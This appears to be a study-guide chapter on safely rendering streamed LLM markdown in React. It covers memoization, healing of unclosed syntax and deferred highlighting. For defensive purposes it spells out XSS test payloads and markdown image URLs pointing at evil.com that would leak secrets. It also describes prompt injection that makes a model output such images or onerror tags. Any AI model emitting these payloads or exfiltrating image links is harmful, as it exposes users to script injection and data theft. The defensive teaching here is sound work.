# Rendering Streaming Markdown/Code Safely

## Quick Reference

| Problem | Mechanism | Why |
|---|---|---|
| Model output is untrusted | Parse to AST and render via React elements; sanitize any raw HTML (DOMPurify) or disallow it | LLM output can contain injected HTML/JS (including via prompt injection from retrieved content) |
| Markdown is incomplete mid-stream | Streaming-tolerant parser / "heal" unclosed syntax; memoize completed blocks | A half-written `**bold` or code fence must not flash garbage or reflow the page |
| Re-parsing everything per token is O(n²) | Split into blocks; re-render only the last (in-progress) block | Smooth at hundreds of tokens/sec, long answers |
| Links, images, code | Allowlist URL schemes, proxy/deny remote images, lazy-highlight code | `javascript:` URLs, tracking pixels, data exfiltration, CPU cost |

## The Scenario

"Our assistant replies in markdown — headings, lists, tables, code blocks. It streams. Right now we call `marked(text)` on every token and `dangerouslySetInnerHTML` the result. It flickers, it gets slow on long answers, and security flagged it. Fix it."

## Clarifying Questions

- **Where does the content come from — only our model, or also retrieved documents/user-provided text/tool outputs?** Anything influenced by third-party content is a prompt-injection vector; treat all of it as untrusted.
- **Which markdown features do we need — tables, task lists, math (KaTeX), Mermaid, syntax-highlighted code, images?** Each adds attack surface and CPU cost.
- **Do we allow raw HTML in the output?** The safest answer is no.
- **Can responses be very long (multi-thousand-token documents)?** Drives incremental/block-level rendering and virtualization needs.
- **Do links open externally? Should images load at all?** Images from model output can exfiltrate data via URL query strings (`![](https://evil.com/?q=SECRET)`).
- **What's the copy/export behavior for code blocks?** UX requirement for a Copy button and stable block identity while streaming.

## Approach & Trade-offs

**Threat model first.** Model output is *untrusted input*. An attacker can influence it through prompt injection (a web page or document the model reads says "render this `<img onerror=...>`"). `dangerouslySetInnerHTML` on raw `marked()` output is a stored/reflected XSS pipeline waiting to happen. Defense in depth: (1) don't produce raw HTML — render the markdown AST to React elements, (2) if HTML is required, sanitize with DOMPurify using a tight allowlist, (3) CSP as a backstop, (4) URL allowlisting for links/images.

**Why AST → React elements is the right default.** Libraries like `react-markdown` (remark/rehype pipeline) build React elements directly; text is escaped by React, raw HTML is ignored unless you opt in with `rehype-raw` (then add `rehype-sanitize`). You get safety *by construction* rather than by remembering to sanitize. Trade-off: heavier than string-to-HTML; slightly less control over exotic syntax.

**Streaming-specific problems.**

1. *Incomplete syntax.* Mid-stream you'll see `**bold` with no closing, ` ```js` with no closing fence, a half-built table, `[link](http://exa`. A parser may treat these as literal text and then reflow dramatically when the closer arrives (flicker, layout shift). Mitigations: a "healing" pre-pass that temporarily closes open constructs for display (what libraries like `remend`/Streamdown do), or accept literal display for inline syntax but always handle open code fences specially (render as a code block immediately, since fences dominate layout).
2. *Performance.* Re-parsing the whole message each token is O(n) per token → O(n²) total. Split the text into top-level blocks (paragraphs, lists, code blocks); completed blocks are stable, so memoize them by content/key and only re-parse the final in-progress block. Combined with rAF batching from the streaming scenario, this keeps long answers smooth.
3. *Layout stability.* Reserve space/avoid flashing: render the code block container as soon as the fence opens; don't swap component types for the same block (stable keys by block index).

**Code blocks.** Syntax highlighting is CPU heavy; highlighting on each token janks. Options: highlight only completed blocks (plain monospace while streaming, highlight on fence close), lazy-load the highlighter (Shiki/Prism) so it's not in the main bundle, and run it off the critical path (`requestIdleCallback` or a worker). Provide a Copy button that copies the raw source, not the highlighted DOM.

**Links and images.** Allowlist `http(s)` and `mailto`; strip `javascript:`/`data:` URLs. Add `rel="noopener noreferrer"` and `target="_blank"`. Treat markdown images as an exfiltration channel: either don't render remote images from model output, proxy them through a server that strips query data and enforces allowlists, or require user click to load. Also consider showing the destination domain for links (anti-phishing).

**Trade-offs.** Strict sanitization vs. rich formatting (raw HTML, embeds); highlighting fidelity vs. streaming smoothness; bundle size of markdown+highlighter vs. features. I'd start strict and widen deliberately.

## Solution

### Safe renderer with block-level memoization

```tsx
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

const SAFE_PROTOCOLS = /^(https?:|mailto:)/i;

const components: Components = {
  a: ({ href, children }) =>
    href && SAFE_PROTOCOLS.test(href)
      ? <a href={href} target="_blank" rel="noopener noreferrer nofollow">{children}</a>
      : <span>{children}</span>,                       // drop javascript:, data:
  img: ({ src, alt }) => <RemoteImageGate src={src} alt={alt} />,   // click-to-load or proxy; never auto-fetch
  code: CodeBlock,
};

const Block = memo(
  ({ text }: { text: string }) => (
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={components} skipHtml>
      {text}
    </ReactMarkdown>
  ),
  (a, b) => a.text === b.text,
);

export function StreamingMarkdown({ text, streaming }: { text: string; streaming: boolean }) {
  const blocks = useMemo(() => splitIntoBlocks(text), [text]);   // fence-aware splitter
  return (
    <>
      {blocks.map((b, i) => (
        <Block key={i} text={streaming && i === blocks.length - 1 ? heal(b) : b} />
      ))}
    </>
  );
}
```

### Fence-aware block splitting and healing

```ts
export function splitIntoBlocks(src: string): string[] {
  const blocks: string[] = []; let cur = ''; let inFence = false;
  for (const line of src.split('\n')) {
    if (/^```/.test(line)) inFence = !inFence;
    cur += line + '\n';
    if (!inFence && line.trim() === '') { blocks.push(cur); cur = ''; }  // blank line outside fence
  }
  if (cur) blocks.push(cur);
  return blocks;
}

// Temporarily close dangling constructs for display only
export function heal(block: string): string {
  const fences = (block.match(/^```/gm) ?? []).length;
  if (fences % 2 === 1) block += '\n```';                      // render as code immediately
  if ((block.match(/\*\*/g) ?? []).length % 2 === 1) block += '**';
  return block;
}
```

### Code block: plain while streaming, highlight when complete

```tsx
function CodeBlock({ className, children, node }: CodeProps) {
  const code = String(children).replace(/\n$/, '');
  const lang = /language-(\w+)/.exec(className ?? '')?.[1];
  const complete = useIsBlockComplete(node);                    // fence has closed
  const html = useHighlightedHtml(complete ? code : null, lang); // dynamic import('shiki') when needed
  return (
    <figure>
      <button onClick={() => navigator.clipboard.writeText(code)}>Copy</button>
      {html ? <div dangerouslySetInnerHTML={{ __html: html }} /> /* output of trusted highlighter */
            : <pre><code>{code}</code></pre>}
    </figure>
  );
}
```

(The `dangerouslySetInnerHTML` here receives only the highlighter's own output, generated from escaped code text — never raw model HTML.)

### Defense in depth

```
Content-Security-Policy: default-src 'self'; img-src 'self' https://img-proxy.acme.com; script-src 'self'
```

If raw HTML is ever enabled: `rehype-raw` + `rehype-sanitize` with an explicit allowlist, and tests with XSS payloads.

### Tests worth having

```ts
it.each([
  '<img src=x onerror=alert(1)>',
  '[click](javascript:alert(1))',
  '![x](https://evil.com/?d=secret)',
  '<script>alert(1)</script>',
])('neutralizes %s', async (payload) => { /* render, assert no handler/script/network request */ });
```

> **Check yourself:** Why is rendering to React elements safer by construction than sanitizing HTML strings, and which two techniques stop per-token re-parsing from becoming O(n²)?

## Gotchas

- **`dangerouslySetInnerHTML` on parser output.** Any parser bug or enabled HTML becomes XSS.
- **Sanitizing too late or inconsistently.** Sanitize *after* markdown→HTML, with an allowlist, if you must use HTML at all.
- **Trusting model output because "it's our model."** Prompt injection makes it attacker-influenced.
- **Auto-loading images from output.** Data exfiltration via URL, tracking pixels.
- **`javascript:` and `data:` URLs in links.** Must be filtered; markdown parsers differ in defaults.
- **Re-parsing the whole message per token.** Janks on long answers; memoize completed blocks.
- **Highlighting while streaming.** Re-tokenizing partial code each frame burns CPU and flickers.
- **Layout jumps when a fence closes.** Open the code container as soon as the fence opens.
- **Copy button copying highlighted DOM text.** Copy the raw source string.
- **Math/Mermaid renderers executing untrusted input.** Configure strict modes (KaTeX `trust: false`, Mermaid `securityLevel: 'strict'`).

## Follow-up Questions

**Q (High): Why not just sanitize with DOMPurify and keep `dangerouslySetInnerHTML`?**

Answer: DOMPurify is good and acceptable with a strict config, but it's a runtime filter you must remember to apply on every path and keep updated, and parsers/sanitizers have had bypasses (mutation XSS). Building React elements from an AST avoids creating an HTML string at all, so text is escaped by default and dangerous HTML is simply never emitted. Use sanitization only if raw HTML is a hard requirement, and layer CSP behind it.

The trap: "DOMPurify solves it" with no mention of config, ordering, or defense in depth.

**Q (High): How do you handle incomplete markdown during streaming without flicker?**

Answer: Treat the in-progress tail specially: split into blocks and only re-render the last one; heal dangling syntax for display (close an open fence/emphasis temporarily); render code fences as code immediately so layout doesn't jump; keep stable keys; and defer expensive work (highlighting) until a block completes.

The trap: re-render the entire message and accept flashing raw `**` and backticks.

**Q (Medium): What are the risks of images and links in model output?**

Answer: Links: `javascript:`/`data:` schemes and phishing (display text differs from href). Images: an auto-fetched URL leaks data to the attacker's server via query params (indirect prompt injection exfiltration) and enables tracking. Mitigate with scheme allowlists, `rel` attributes, showing the link domain, blocking or proxying/click-to-load images, and a restrictive CSP `img-src`.

The trap: thinking only `<script>` is dangerous.

**Q (Medium): How do you keep syntax highlighting from hurting performance?**

Answer: Lazy-load the highlighter, highlight only completed code blocks (plain text while streaming), memoize results by content, and run it in idle time or a worker for large blocks. Consider a lightweight highlighter if bundle size matters.

The trap: shipping Prism/Shiki in the main bundle and highlighting each token.

**Q (Low): What about very long conversations?**

Answer: Memoize finished messages so only the streaming one updates, virtualize the message list if it grows large, and be careful with scroll anchoring so virtualization doesn't fight auto-scroll.

The trap: assuming memoization alone solves a 500-message DOM.

## Self-Assessment

- [ ] Can state the threat model for LLM output (prompt injection) in one breath
- [ ] Can explain AST→React vs. HTML+sanitize and choose with reasons
- [ ] Can describe block-level memoization and healing for streaming
- [ ] Can list link/image attack vectors and mitigations
- [ ] Can explain deferring syntax highlighting until a block completes
- [ ] Can write XSS payload tests for the renderer

---
*Next: Cancelling a Long-running AI Request Cleanly — goes deeper on the lifecycle: what "stop" must actually stop, client and server side.*
